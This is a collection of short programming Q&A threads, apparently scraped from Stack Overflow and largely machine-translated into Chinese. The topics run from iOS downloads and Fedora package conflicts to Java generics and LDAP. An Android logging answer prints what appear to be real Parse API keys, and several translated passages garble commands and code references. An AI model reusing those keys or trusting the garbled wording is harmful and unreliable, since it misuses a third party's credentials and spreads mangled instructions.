                                          [cell setDownloadProgress:(float)numberOfCompletedOperations/(float)totalNumberOfOperations];
                                      });

                                  } completionBlock:^(NSArray *operations) {
                                      [cell setDownloaded:YES];
/*                                      for (AFHTTPRequestOperation *ro in operations) {

                                          if (ro.error) {

                                              NSLog(@"++++++++++++++ Operation error");

                                          }else {
                                              //NSLog(@"Operation OK: %@", [ro.responseData description]);
                                          }
                                      }*/

                                  }]; 
```

但是我无法在进度块期间保存图像（因为我没有其他参数到块）并且遍历操作数组可能会消耗一些内存，以防图像真的很重或有很多页数。我读过有人建议使用

```
operation.outputStream = [NSOutputStream outputStreamToFileAtPath:@"download.zip" append:NO]; 
```

但在这种情况下，我没有直接的图像流，而是 plist 中包含的值。有没有人面临这个问题以及如何解决它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:52:59.520

您可以设置`completionBlock`每个操作来执行您需要的任何操作，无论是保存`responseData`某处还是您拥有什么。

请注意，不能保证所有操作的完成块将在批处理完成时完成，因此不要依赖批处理完成块中的那个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T15:05:35.093

```
// You need this line to download the file directly to the path above, as you pointed out
operation.outputStream = [NSOutputStream outputStreamToFileAtPath:filePath append:NO];

// Within the completion block, you can have some thing like
NSString *contentDisposition = [[operation.response allHeaderFields] objectForKey:@"Content-Disposition"];

and within contentDisposition string you will have the file name etc. That way, you will know the file name to save. 
```

# fedora - Fedora 17 yum 更新：无法完成软件包更新

> ID：13271582
> 
> 赞同：-3
> 
> 时间：2012-11-07T14:18:15.630
> 
> 标签：fedora, yum

处理依赖后“yum update”产生错误：

```
--> 完成依赖解析
错误：包：perl-CPAN-1.9600.01-215.fc17.noarch（更新）
           要求：perl = 4:5.14.2-215.fc17
           已安装：4:perl-5.14.3-202.fc16.i686 (@updates/16)
               perl = 4:5.14.3-202.fc16
           可用：4:perl-5.14.2-211.fc17.i686 (fedora)
               perl = 4:5.14.2-211.fc17
           可用：4:perl-5.14.2-215.fc17.i686（更新）
               perl = 4:5.14.2-215.fc17
错误：包：1:perl-IPC-Cmd-0.70-215.fc17.noarch（更新）
           要求：perl = 4:5.14.2-215.fc17
           已安装：4:perl-5.14.3-202.fc16.i686 (@updates/16)
               perl = 4:5.14.3-202.fc16
           可用：4:perl-5.14.2-211.fc17.i686 (fedora)
               perl = 4:5.14.2-211.fc17
           可用：4:perl-5.14.2-215.fc17.i686（更新）
               perl = 4:5.14.2-215.fc17

```

这种类型的错误很多，主要与 perl 有关。但是安装了所需的 perl 版本：

```
百胜安装 perl-5.14.2-215.fc17.i686
加载的插件：auto-update-debuginfo、presto、refresh-packagekit
与 4:perl-5.14.2-215.fc17.i686 匹配的软件包已安装。检查更新。
没事做

```

跳过损坏的选项没有帮助。

似乎从版本 16 升级到 17 卡在进程中间

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T16:49:12.157

从 Fedora 16 升级到 Fedora 17 后，我遇到了完全相同的问题（这个升级很糟糕）。似乎 perl-5.14.2-XXX.fc17 包没有出现在 repo 更新列表中，因为已经安装的版本 (perl-5.14.3.fc16) 是“更新的”。这是我刚刚为解决问题所做的。

1.  检查您的系统上已经安装了哪个版本：
    *   perl-5.14.3.fc16
2.  下载更新版本的 rpm。就我而言（您可能需要其他库）：
    *   perl-5.14.2-211.fc17.x86_64.rpm
    *   perl-libs-5.14.2-211.fc17.x86_64.rpm
    *   perl-Carp-1.20-211.fc17.noarch.rpm
    *   perl-Digest-MD5-2.51-211.fc17.x86_64.rpm
    *   perl-Digest-1.17-2.fc17.noarch.rpm
    *   perl-macros-5.14.2-211.fc17.x86_64.rpm
3.  更新允许旧包（超级用户）：

    *# rpm -U --oldpackage perl-* .rpm*

4.  返回 yum update 以完成更新缺少的库和包。

如果您仍然有一些不允许您这样做的库依赖问题，您可能必须先删除这些库，但通常情况下它会顺利进行。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T08:52:28.240

我已经通过删除问题包并在更新完成后再次安装它们来解决它。

# jquery-ui - jQuery-Timepicker-Addon 删除预加载日期的时间

> ID：13271584
> 
> 赞同：0
> 
> 时间：2012-11-07T14:18:19.313
> 
> 标签：jquery-ui, datetimepicker

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:30:32.023

好吧，我发现了一些有用的东西。我猜 'defaultDate' 选项不能像我预期的那样工作。如果它在初始化后在 datetimepicker 上设置日期，它就可以工作。

```
startDatePicker.datetimepicker('setDate', startDate);
endDatePicker.datetimepicker('setDate', endDate); 
```

# android - Default Timeout for Launching an Android App

> ID：13271585
> 
> 赞同：1
> 
> 时间：2012-11-07T14:18:30.637
> 
> 标签：android

Is there a default timeout when launching an Android app? For example, if I tap on an app from the Applications screen and the app does not display it's default activity within a certain timeframe, will I get a "Force close or continue waiting" type message? If so, is this timeout adjustable?

# java - Prevent Re Loading an Activity while returning from Camera App

> ID：13271587
> 
> 赞同：1
> 
> 时间：2012-11-07T14:18:38.680
> 
> 标签：java, android, android-intent, android-camera, android-orientation

I am creating an app which uses the camera app to take pictures. Once I return from the camera app the entire view gets recreated. To stop this I have added

```
android:screenOrientation="portrait"
android:configChanges="orientation|keyboardHidden" 
```

in the Manifest file for the specified activities. But this is still happening.

To be more precise of my issue, I am using Activity Group with TabHost. After a picture is taken using the camera I am redirecting the user to a different screen. But this is not working as the entire view is reloaded. Instead the user is taken back to the first screen in activity group.

I dont want this to happen. Is it posible to set orientation fro camera! How can I do this properly?

For those interested I am adding the code which I use to start camera

```
Intent camera = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
Uri pictureUri = Uri.fromFile(new File("/sdcard/myimage.jpg"));
camera.putExtra(MediaStore.EXTRA_OUTPUT, pictureUri);
this.getParent().startActivityForResult(camera, PICTURE_RESULT); 
```

Thanks

# java - Not able to read user attribute from OU of a active directory in java

> ID：13271590
> 
> 赞同：2
> 
> 时间：2012-11-07T14:18:47.470
> 
> 标签：java, active-directory, ldap

I have OU (say ou1) in AD server and it has a user (say user1). I want query all the users belong to a OU of AD directory server. I am trying as show below :

```
SearchControls ouctls = new SearchControls();
String[] ouattrIDs = {"displayname", "mail", "canonicalName", "memberOf","Users"};
ctls.setReturningAttributes(ouattrIDs);
ctls.setSearchScope(SearchControls.SUBTREE_SCOPE);

NamingEnumeration ouanswer = ctx.search("dc=exam,dc=com","(objectclass=group)", ouctls); 
```

and by these I am not find user attribute populated.

```
while (ouAnswer.hasMoreElements()) {
        SearchResult rslt = (SearchResult) ouAnswer.next();
        Attributes attrs = rslt.getAttributes();
        //log.debug("Group attributes"+attrs.get("cn"));
        System.out.println("gr-->"+attrs.toString());
        Attribute temp = attrs.get("cn");
} 
```

Can you please help me in finding user object under a OU.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T10:49:10.233

如果您的意思`user1`是从属`ou=ou1`并且您知道 的可分辨名称，则将`ou`其用作搜索请求中的基本对象。例如，如果`ou`直接从属于`dc=exam,dc=com`，`ou=ou1,dc=exam,dc=com`则在搜索中用作基础对象。在这种情况下，如果您知道用户条目直接从属于`ou=ou1`，则可以将搜索范围缩小到一级。否则，必须使用子树范围。使用过滤器来缩小将从服务器返回的结果的范围。在您给出的示例中，过滤器可能应该是：`(&(cn=user1)(objectclass=group))`。这假设 user1 的命名属性是`cn`并且条目是 objectClass `group 的成员。在 LDAP 客户端的代码中使用正确的值。

### 也可以看看

*   [LDAP：编程实践](http://www.ldapguru.info/ldap/ldap-programming-practices.html)
*   [LDAP：使用 ldapsearch](http://ff1959.wordpress.com/2011/07/27/mastering-ldapsearch/)
*   [LDAP：搜索最佳实践](http://www.ldapguru.info/ldap/ldap-search-best-practices.html)

# sql - tsql : Delete query

> ID：13271591
> 
> 赞同：-3
> 
> 时间：2012-11-07T14:18:48.747
> 
> 标签：sql, sql-server-2008, tsql

```
DELETE abc 
FROM abc INNER JOIN xyz ON 
abc.RECORD_TYPE = xyz.RECORD_TYPE AND 
abc.IN = xyz.IN 
OPTION (MERGE JOIN, LOOP JOIN) 
```

can anyone tell me what exactly the query doing ?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:21:41.047

This `DELETE` all the records from the table `abc` with `JOIN` to another table. It deletes all the records in the table `abc` that has a `RECORD_TYPE` value equal to the `RECORD_TYPE` in the other table AND in the same time the value `IN` are equals in the two table.

It is a normal [**`DELETE`**](http://msdn.microsoft.com/en-us/library/ms189835.aspx) clause, Where the `FROM` can contain extra joined table as specified by the documentation:

> FROM clause:
> 
> This extension, specifying a join, can be used instead of a subquery in the WHERE clause to identify rows to be removed.

# java - JOptionPane is reappearing once

> ID：13271598
> 
> 赞同：0
> 
> 时间：2012-11-07T14:19:15.167
> 
> 标签：java, swing, user-interface, dialog, joptionpane

This is my second time posting a question on stackOverflow. In my code I have a JOptionPane that will allow the user to press "OK" or "Cancel". If the user presses "OK" the code should return an ArrayList containing either ALL the values or the SELECTED values.

I have tested this code and it seems to work, or so it seems. Whenever the user clicks on the "OK" button for the first time, the JOptionPane closes but reappears after that. When the user has clicked on the "OK" button for a second time, the code works like it should, and the window closes without reappearing.

```
/**
 * This method will show a list of files to the user and give the user the option to continue or abort the copy.
 * 
 * @param resultList
 * @return ArrayList with values or null
 */
public ArrayList<String> display(ArrayList<String> resultList) {
    JPanel panel = new JPanel();
    //Here the list is being filled with the arrayList from the parameter.
    JList list = new JList(resultList.toArray());
    //Here the JLabel is added to the JPanel.
    panel.add(new JLabel("These files will be copied:"));
    JScrollPane scrollpane = new JScrollPane(list);
    scrollpane.setPreferredSize(new Dimension(400,200));
    panel.add(scrollpane);

    //Here the JOption,Pane is being shown with a confirm dialog.
    int result = JOptionPane.showConfirmDialog(null, panel, "Copy",JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
    //If the users clicks on the OK button the method will return the selected values.
    if (result == JOptionPane.OK_OPTION) {
        //Check if the user has selected some values, if not the method will return all the values.
        if(list.getSelectedValues().length < 1){
            return resultList;
        }
        //If the user has selected some values the method will get them, fill an ArrayList with them and return them.
        else{
            @SuppressWarnings({ "rawtypes", "unchecked" })
            ArrayList<String> results = new ArrayList(Arrays.asList(list.getSelectedValues()));
            return results;
        }
    }
    //Return null if the user has pressed Cancel.
    else{
        return null;
    }
} 
```

I believe the problem is in this line:

```
 if (result == JOptionPane.OK_OPTION) { 
```

But I don't understand why because I already have done a similar thing in my actionHandler for the delete button, which works like it should.

```
/**
     * This is the actionListener for the delete button.
     * This method will delete the values and properties of the selected configuration.
     */
    deleteButton.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent arg0) {
            MessageConsole mc = new MessageConsole(textArea);
            //Here the getSaveAction is being used with the correct parameter values that are gained from the fields.
            mc.redirectOut();
            //Check if the user has entered a configuration name.
            if(configName.getSelectedItem().toString().length() > 0){
                int result1 = JOptionPane.showConfirmDialog(null, "Are you sure you want to delete this configuration?", "Delete", JOptionPane.YES_NO_OPTION);
                if(result1 == JOptionPane.YES_OPTION){
                    int result2 = JOptionPane.showConfirmDialog(null,"Are you really sure?", "Delete", JOptionPane.YES_NO_OPTION);
                    if(result2 == JOptionPane.YES_OPTION){
                        //If the user has entered a configuration name the method will delete all the properties and values that belong to it.
                        gf.getDeleteAction(configName.getSelectedItem().toString());
                        sourceField.setText("");
                        destinationField.setText("");
                        endsWithField.setText("");
                        containsField.setText("");
                        yearAfterField.setText("");
                        monthAfterField.setText("");
                        dayAfterField.setText("");
                        hourAfterField.setText("");
                        minuteAfterField.setText("");
                        secondAfterField.setText("");
                        yearBeforeField.setText("");
                        monthBeforeField.setText("");
                        dayBeforeField.setText("");
                        hourBeforeField.setText("");
                        minuteBeforeField.setText("");
                        secondBeforeField.setText("");
                        setComboBox();
                    }
                    if(result2 == JOptionPane.NO_OPTION){
                        System.out.println("Nothing has been deleted.");
                    }
                }

                if(result1 == JOptionPane.NO_OPTION){
                    System.out.println("Nothing has been deleted.");
                }
            }
            //If the user has not entered a configuration name the system will print a message.
            else{
                System.out.println("You need to select a configuration name");
            }
        }
    }); 
```

I'm hoping my question has enough structure and information to be answered.

-lordarnoud

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T12:36:43.703

我犯了一个愚蠢的错误。最初使用代码时没有 JOptionPane。所以我忘了我在支票上用过它。

```
if(cfa.display(resultList) != null){
            results.addAll(cfa.display(resultList)); 
```

我要感谢那些发表评论的人。我学到了一些关于提问的新知识，并确保检查我的代码的每一部分，即使它看起来不相关。

-洛达努德

# javascript - Javascript function for onclick

> ID：13271602
> 
> 赞同：1
> 
> 时间：2012-11-07T14:19:36.407
> 
> 标签：javascript, html, function, onclick, peoplesoft

This link calls the javascript event onclick. I don't know what this part is doing though:

```
"javascript:iContentOpen('/psc/'+iGetSiteName()+'/EMPL/EMP/d/EPPCM_CONTENT_MMT.EPM_PUB_VIEWER.GBL?Action=U&EPPCM_CONTENTID=9732&EPPCM_CATG_TYPE=R',true)" 
```

This is part of a Peoplesoft application. Could someone please explain to me what happens when the user clicks this link? Here is the rest of the code..

```
<a id="Left" class="NCCPUSHBUTTON" onclick="javascript:iContentOpen('/psc/'+iGetSiteName()+'/EMPL/EMP/d/EPPCM_CONTENT_MMT.EPM_PUB_VIEWER.GBL?Action=U&EPPCM_CONTENTID=9732&EPPCM_CATG_TYPE=R',true)" href="javascript:;"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:21:39.760

它从一个什么都不做的[标签](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/label)开始，因为没有循环（大概作者认为他们在说“这是 JavaScript”（他们不是））。

然后它调用一个带有两个参数的函数，一个字符串（由连接其他一些字符串和另一个函数调用的返回值组成）和一个布尔值。

您还没有与我们共享这两个函数（它们不是 JS 内置插件或浏览器内置插件），所以我们不知道它们会做什么。

# java - 不能使用列表 > 从不同地方调用时在方法参数中

> ID：13271605
> 
> 赞同：6
> 
> 时间：2012-11-07T14:19:49.043
> 
> 标签：java, list, generics

在我的代码中，我有多个实例，`List<Future<something>>`我希望有一个方法来处理等待它们完成的等待。但我得到一个编译器异常告诉我`actual argument List<Future<Boolean>> cannot be converted to List<Future<?>>`。

这是方法头：

```
public void waitForIt(<List<Future<?>> params) 
```

这就是它的名称：

```
...
List<Future<Boolean>> actions = new ArrayList<Future<Boolean>>();
waitForIt(actions); <-- compiler error here
... 
```

我需要这个为`List<Future<Map<String, String>>>`其他几个工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T19:47:00.400

用这个：

```
public void waitForIt(List<? extends Future<?>> params) 
```

当你有`List<A>`and`List<B>`时，A 和 B 必须*完全匹配*。由于`Future<Boolean>`与 不完全相同`Future<?>`，因此不起作用。

`Future<Boolean>`是 的子类型`Future<?>`，但这还不够。即使 A 是 B 的`List<A>`子类型，也不是的子类型。`List<B>`

我们在类型参数中使用通配符，`List`这样它就不必完全匹配。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:38:14.903

用这个：

```
public <T> void waitForIt(List<Future<T>> params) 
```

因为`Future<Boolean>`不是扩展`Future<?>`

[http://ideone.com/tFECPN](http://ideone.com/tFECPN)

# android - 使用 gps 后 http 请求不起作用

> ID：13271606
> 
> 赞同：0
> 
> 时间：2012-11-07T14:19:51.453
> 
> 标签：android, gps, httprequest

我的应用程序的一部分有问题，在一种情况下，我在 json 流上使用 http 请求来获取一些数据，它工作得非常好。但在另一种情况下，我必须使用用户的位置来获取数据。使用位置提供程序后，http 请求无法正常工作。此问题仅出现在我必须测试我的应用程序的两个设备之一上。第一个，Android 2.3.6 的智能手机，我没有问题。但那是在出现问题的第二台设备上：带有 android 4.0.4 的 Galaxy 选项卡（我最近对其进行了更新，之前是 3.0.1，问题是一样的）。我的应用程序是用 sdk 10 (android 2.3.3) 编译的

我尝试捕获出现错误时引发的异常，但异常消息为空，我看不出问题出在哪里。有人遇到过这种错误吗？

这是活动的源代码，可运行的 doRechercheGeoloc 是通过单击按钮启动的：

```
private Runnable doRechercheGeoloc = new Runnable(){

    public void run() {
        // TODO Auto-generated method stub
        getProvider = true;

        LocationListener locationListener = new LocationListener(){
            public void onLocationChanged(Location newLocation) {
                // TODO Auto-generated method stub
                Log.i("*", "GPS : location changed");
                location = newLocation;
            }

            public void onProviderDisabled(String provider) {
                // TODO Auto-generated method stub
                Log.i("*", "GPS : provider disabled");
            }

            public void onProviderEnabled(String provider) {
                // TODO Auto-generated method stub
                Log.i("*", "GPS : provider enable");
            }

            public void onStatusChanged(String provider, int status,
                    Bundle extras) {
                // TODO Auto-generated method stub
                Log.i("*", "GPS : status changed");
            }
        };

        lm = (LocationManager) getSystemService( AnnuaireActivity.LOCATION_SERVICE );
        Log.i("*", "le GPS est activé");
        lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
        location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        lm.removeUpdates(locationListener);
        lm = null;
        getProvider = true;
        lm = null;

        handler.postAtFrontOfQueue(doRecherchePourGeoloc);

    }

}; 
```

以及我进行 http 连接的 json 解析器的代码：

```
public class JsonParser {

...

private String getJson(String url) throws Exception{

    StringBuilder builder = new StringBuilder();
    HttpClient client = new DefaultHttpClient();
    HttpGet get = new HttpGet( url );

    try{

                    //this is this instruction that provoque the error
        HttpResponse response = client.execute( get );
        StatusLine statusline = response.getStatusLine();
        int statuscode = statusline.getStatusCode();

        if (statuscode == 200){
            HttpEntity entity = response.getEntity();
            InputStream content = entity.getContent();
            BufferedReader reader = new BufferedReader( new InputStreamReader(content) );
            String line;
            while((line = reader.readLine()) != null){
                builder.append(line);
            }
        }else{
            Log.e("*", JsonParser.class.toString() + " : Failed to download file");
            throw new Exception(JsonParser.class.toString() + " : Failed to download file");
        }

    }catch( ClientProtocolException e ){
        Log.e("*", "JsonParser.getJson() : ClientProtocolException : " + e.getMessage());
        throw e;//
    }catch( IOException ioe ){
        Log.e("*", "JsonParser.getJson() : IOException : " + ioe.getMessage());
        throw ioe;//
    }catch( Exception e ){
        Log.e("*", "JsonParser.getJson() : Exception : " + e.getMessage());//the erreur is throwing from here and the message is null
        throw e;
    }

    return builder.toString();
}

... 
```

}

谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-07T15:44:29.300

[日志记录](https://stackoverflow.com/questions/3246792/how-to-enable-logging-for-apache-commons-httpclient-on-android)

您使用的是什么 http 包/jar？弄清楚如何为 WIRE 和 HEADERS 打开日志记录。

我使用的包，我必须重新编译/使用单独的 http jar 在运行时获取日志记录。

启用完整日志记录后，您应该有足够的数据来发现您的问题

查看来自 adb logcat 的示例 WIRE 和 HEADERS：

```
D/class ch.boye.httpclientandroidlib.impl.client.DefaultHttpClient(18636): Attempt 1 to execute request
D/class ch.boye.httpclientandroidlib.impl.conn.DefaultClientConnection(18636): Sending request: POST /1/files/audio HTTP/1.1
D/ch.boye.httpclientandroidlib.wire(18636): >> "POST /1/files/audio HTTP/1.1[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "X-Parse-Application-Id: 3KxPBTPSTe8f0iexGanSagCztLp6wSPzJkyMLAbR[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "X-Parse-REST-API-Key: kVl5Z0CXmBSCoQRmE8XSLIDFuLGHMCIkLXXjkuI9[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "Content-Type: audio/*[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "Content-Length: 12074[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "Host: api.parse.com[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "Connection: Keep-Alive[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "[\r][\n]"
D/ch.boye.httpclientandroidlib.headers(18636): >> POST /1/files/audio HTTP/1.1
D/ch.boye.httpclientandroidlib.headers(18636): >> X-Parse-Application-Id: 3KxPBTPSTe8f0iexGanSagCztLp6wSPzJkyMLAbR
D/ch.boye.httpclientandroidlib.headers(18636): >> X-Parse-REST-API-Key: kVl5Z0CXmBSCoQRmE8XSLIDFuLGHMCIkLXXjkuI9
D/ch.boye.httpclientandroidlib.headers(18636): >> Content-Type: audio/*
D/ch.boye.httpclientandroidlib.headers(18636): >> Content-Length: 12074
D/ch.boye.httpclientandroidlib.headers(18636): >> Host: api.parse.com
D/ch.boye.httpclientandroidlib.headers(18636): >> Connection: Keep-Alive
D/ch.boye.httpclientandroidlib.wire(18636): >> "--"
D/ch.boye.httpclientandroidlib.wire(18636): >> "cVxX6b-jxQnxFCczaKHLNZ_Hq8HI9AEW219GW3w"
D/ch.boye.httpclientandroidlib.wire(18636): >> "[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "Content-Disposition"
D/ch.boye.httpclientandroidlib.wire(18636): >> ": "
D/ch.boye.httpclientandroidlib.wire(18636): >> "form-data; name="bin"; filename="myfile.3gp""
D/ch.boye.httpclientandroidlib.wire(18636): >> "[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "Content-Type"
D/ch.boye.httpclientandroidlib.wire(18636): >> ": "
D/ch.boye.httpclientandroidlib.wire(18636): >> "application/octet-stream"
D/ch.boye.httpclientandroidlib.wire(18636): >> "[\r][\n]"
D/ch.boye.httpclientandroidlib.wire(18636): >> "[\r][\n]"
D/dalvikvm(18636): GC_CONCURRENT freed 387K, 5% free 11211K/11719K, paused 12ms+3ms, total 38ms
D/dalvikvm(18636): WAIT_FOR_CONCURRENT_GC blocked 12ms
D/ch.boye.httpclientandroidlib.wire(18636): >> "[0x0][0x0][0x0][0x18]ftyp3gp4[0x0][0x0][0x0][0x0]isom3gp4[0x0][0x0][0x2][0xe7]moov[0 
```

# objective-c - 是否可以使用它作为协议的实现来替换所有对象的方法？

> ID：13271610
> 
> 赞同：0
> 
> 时间：2012-11-07T14:20:15.093
> 
> 标签：objective-c, uiwebview, uimenucontroller, swizzling

是否可以使用它作为协议的实现来替换所有对象的方法？

方法是`canPerformAction:(SEL)action withSender:(id)sender`：

```
- (BOOL)myCanPerformAction:(SEL)action withSender:(id)sender {
    return NO;
} 
```

最初的问题：无法禁用 UIWebView 上的“剪切、复制、粘贴”和“全选”弹出菜单。一些奇怪的对象在其`canPerformAction`方法上生成它们。而且我找不到这个对象来替换它的类上的方法。

非常希望对您有所帮助。很长一段时间都解决不了这个问题。所有其他禁用选择的方法也会禁用我页面上的用户输入。而且我只能替换`canPerformAction`正确或所有类的方法才能使其正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T16:38:36.327

为类 NSObject 创建一个类别并调整其方法。

```
@interface NSObject (myCanPerformAction)

- (BOOL)myCanPerformAction:(SEL)action withSender:(id)sender;

@end 
```

# c# - 当应用程序要全球化和本地化时，我必须做和不做的事情是什么？

> ID：13271611
> 
> 赞同：2
> 
> 时间：2012-11-07T14:20:18.780
> 
> 标签：c#, asp.net, .net, vb.net

**当应用程序要全球化和本地化时，我们需要在代码中更改哪些区域？**

例如

**做**

```
string datenew = Convert.ToDateTime("10/31/2012", CultureInfo.InvariantCulture)
                        .ToString(); 
```

**别**

```
string datenew = Convert.ToDateTime("10/31/2012").ToString(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:35:23.470

检查此链接，它将为您提供基本的了解：**[开发人员的国际化技巧 – I18N 清单](http://www.emreakkas.com/internationalization/10-internationalization-tips-for-developers-i18n-checklist)**

1.  将所有可翻译内容外部化——将文本从代码中取出并放入资源文件中
2.  允许输入国际数据和外国文字
3.  使用 Unicode 进行所有字符串处理
4.  使用系统函数进行日期/时间和数字格式
5.  使用系统函数进行排序和字符串比较

另外，检查这个 - **[SDLC Checklist for Globalized ASP.NET Web Applications](http://www.codeproject.com/Articles/14323/SDLC-Checklist-for-Globalized-ASP-NET-Web-Applicat)**

# objective-c - 从字符串中删除前导 0，目标 C

> ID：13271612
> 
> 赞同：1
> 
> 时间：2012-11-07T14:20:29.107
> 
> 标签：objective-c, nsstring

> **可能重复：**
> [从字符串中删除前导零](https://stackoverflow.com/questions/3657833/removing-leading-zeroes-from-a-string)

我需要从字符串的开头删除 0 并在用户输入数字时防止前导 0，我该怎么做？

例如：用户输入：000090 显示：90

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:36:20.833

一种方法是使用`NSScanner`：

```
NSString *string = @"000090";
NSCharacterSet *nonzeroNumberCharacterSet = [NSCharacterSet characterSetWithCharactersInString:@"123456789"];
NSScanner *scanner = [NSScanner scannerWithString:string];
[scanner scanUpToCharactersFromSet:nonzeroNumberCharacterSet intoString:nil];
NSString *remainder = nil;
NSCharacterSet *emptyCharacterSet = [NSCharacterSet characterSetWithCharactersInString:@""];
[scanner scanUpToCharactersFromSet:emptyCharacterSet intoString:&remainder]; 
```

此时`remainder`等于`@"90"`。

等效地，可以替换行

```
NSCharacterSet *nonzeroNumberCharacterSet = [NSCharacterSet characterSetWithCharactersInString:@"123456789"];
NSScanner *scanner = [NSScanner scannerWithString:string]; 
```

和

```
NSCharacterSet *zeroNumberCharacterSet = [NSCharacterSet characterSetWithCharactersInString:@"0"];
[scanner scanCharactersFromSet:zeroNumberCharacterSet intoString:nil]; 
```

扫描过去所有的零，而不是扫描到第一个非零数字。

这种方法的一个缺点是，如果原始字符串是`@"000000000"`，则结果字符串将为空。

# json - JSON 和不断变化的数据集

> ID：13271613
> 
> 赞同：1
> 
> 时间：2012-11-07T14:20:34.357
> 
> 标签：json, d3.js

我对 JSON 相当陌生，我想创建一个 choropleth 示例。[http://gabrielflor.it/a-half-decade-of-rising-poverty](http://gabrielflor.it/a-half-decade-of-rising-poverty)每当点击年份时，它只会转到 JSON 的不同部分（我假设）。这是为了避免重新绘制整个地图并调用另一个 JSON.js 文件，通常如何完成这样的功能？如果是这样，这些 .JSON 文件会变得很大吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:44:13.663

使用 JSON 只是一种存储每年所需值的方法。当您切换到另一年时，JS 解析给定年份的 JSON 并更新 choropleth。对于您提供的示例，这里是使用的 JSON：

[http://gabrielflor.it/static/data/saipe.json](http://gabrielflor.it/static/data/saipe.json)

这是一个好方法，因为您每年只需要一个 JSON，并且只加载一次。**但是，由于 d3 需要这种方式的数据，我认为如果您想提供额外的数据**，例如 gabrielflor 示例，您应该添加另一个 JSON：

[http://gabrielflor.it/static/js/d3.poverty-by-county.js?v=121107](http://gabrielflor.it/static/js/d3.poverty-by-county.js?v=121107)

他用 d3 像这样加载 JSON：

`d3.json('../static/data/states.json', function (json) { states = json; });`

或者

`d3.json('../static/data/saipehighlights.json', function (json) { saipehighlights = json; });`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:48:19.337

如果您查看您提供的示例页面的网络流量（例如使用 Chrome 开发人员工具）。贫困数据文件很大，但映射数据文件更大。您会注意到，网站加载需要更长的时间，但之后它在客户端运行非常流畅，无需进行任何服务器调用。

该网站只是关于浏览信息和漂亮的设计 - 为此我认为如果用户体验更流畅（即用户不必等待年份数据加载），更长的加载时间是完全可以接受的。

# c# - 如何为现有的 .epub 文件添加水印？

> ID：13271615
> 
> 赞同：0
> 
> 时间：2012-11-07T14:20:36.980
> 
> 标签：c#, epub, watermark

我可以知道我必须遵循哪种策略来为现有的 epub 文件添加水印吗？对现有代码或库有什么建议吗？

特别是我想在文档的一页中插入水印。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T13:53:31.517

这是关于该主题的讨论，

[http://www.mobileread.com/forums/showthread.php?t=75585](http://www.mobileread.com/forums/showthread.php?t=75585)

似乎有一些探索途径。哪一个最适合您的需求实际上取决于您需要水印的目的。

# php - PHP中数值字段[属性]的状态是什么

> ID：13271617
> 
> 赞同：1
> 
> 时间：2012-11-07T14:20:50.997
> 
> 标签：php, oop, yii

我最初创建一个对象：

```
car{gearNumber,tyres} 
```

其中 gearNumber 和轮胎是汽车属性......并将其保存在数据库（mysql）中，而不为 gearNumber 和轮胎分配任何值。

当我获取汽车对象并尝试增加齿轮编号时，什么也没有发生。解决方法是`0`在对象创建时设置默认值（），但我不想再次返回编辑汽车类，因为 php 以某种方式分配值苍蝇...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:26:29.650

不查看实际代码很难判断，但在从数据库中检索行时，可能会在对象的属性中放置一个空字符串（或空值）。

关于解决方法，有很多。也许您正在寻找的是创建一个以 gearNumber 和轮胎作为参数的[构造函数。](http://www.php.net/manual/en/language.oop5.decon.php)这就是OO的说法“如果你想创造一辆汽车，那么你必须提供齿轮号和轮胎”。

高温高压

# objective-c - IOS 设备可以使用 html5 视频和 phonegap/cordova 从本地文件系统流式传输 m3u8 分段视频吗？

> ID：13271624
> 
> 赞同：1
> 
> 时间：2012-11-07T14:21:09.150
> 
> 标签：objective-c, ios, cordova, video-streaming

我正在使用phonegap/cordova 2.1，并且我的应用程序具有本地存储的资产（在设备上），这些资产需要在构建时加密并在执行时在内存中解密。该应用程序仅适用于 iPad。

对于视频，我想实现类似于[http://codebycoffee.com/2012/01/08/decrypting-http-streaming-video-with-nsurlprotocol](http://codebycoffee.com/2012/01/08/decrypting-http-streaming-video-with-nsurlprotocol)的视频，其中 mediafilesegmenter 用于分割和加密每个视频文件，然后自定义当视频播放器请求 m3u8 文件时，加密文件 url 协议为每个视频提供密钥。

